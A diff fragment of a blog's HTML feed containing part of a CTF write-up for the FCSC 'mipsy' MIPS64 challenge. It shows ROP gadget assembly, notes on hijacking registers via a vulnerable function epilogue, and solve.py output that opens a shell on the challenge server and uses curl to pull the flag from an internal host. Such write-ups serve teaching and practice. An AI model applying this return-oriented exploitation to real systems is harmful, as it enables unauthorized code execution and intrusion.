+0x000000012001270c : ld <span class="nv">$v1</span>, 0x80<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0xf0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> dsubu <span class="nv">$s5</span>, <span class="nv">$v0</span>, <span class="nv">$v1</span> <span class="p">;</span> dsll <span class="nv">$v0</span>, <span class="nv">$s5</span>, <span class="m">6</span> <span class="p">;</span> ld <span class="nv">$a0</span>, 0xb8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0xe0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> move <span class="nv">$a1</span>, <span class="nv">$v0</span> <span class="p">;</span> sd <span class="nv">$v1</span>, 0xf8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0x100<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span>
+<span class="o">[</span>skip<span class="o">]</span>
+</code></pre></div><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
 <p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
@@ -5827,46 +5823,46 @@ So we have to add to our payload:</p>
 </div>
 <p>According to the statements we need to read some files stored on the filer machine.
 So firstly let&rsquo;s run the exploit to get the shell:</p>
-<pre><code>$ ./solve.py                                                                  
-[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
-[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
-[*] 'mipsy/mipsy'
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./solve.py                                                                  
+<span class="o">[</span>!<span class="o">]</span> Could not emulate PLT instructions <span class="k">for</span> ELF<span class="o">(</span><span class="s1">&#39;mipsy/mipsy&#39;</span><span class="o">)</span>
+<span class="o">[</span>!<span class="o">]</span> Could not populate PLT: not enough values to unpack <span class="o">(</span>expected 2, got 0<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;mipsy/mipsy&#39;</span>
     Arch:     mips64-64-big
     RELRO:    Full RELRO
     Stack:    No canary found
     NX:       NX disabled
-    PIE:      No PIE (0x120000000)
+    PIE:      No PIE <span class="o">(</span>0x120000000<span class="o">)</span>
     RWX:      Has RWX segments
-[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
-[*] Switching to interactive mode
+<span class="o">[</span>+<span class="o">]</span> Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 Error: wrong password.
 $ id
-uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
 $ ls
 list_interfaces.sh
 mipsy
 $
-</code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
-<pre><code>$ curl filer
-&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
+</code></pre></div><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl filer
+&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
 &lt;html&gt;
 &lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
-&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span>&gt;
+&lt;title&gt;Directory listing <span class="k">for</span> /&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;h1&gt;Directory listing <span class="k">for</span> /&lt;/h1&gt;
 &lt;hr&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;flag&quot;&gt;flag&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span>&gt;flag&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
-<pre><code>$ curl filer/flag
-FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
-</code></pre><p>And we got the flag !
+</code></pre></div><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl filer/flag
+FCSC<span class="o">{</span>82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519<span class="o">}</span>
+</code></pre></div><p>And we got the flag !
 This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
 ]]></content>
             
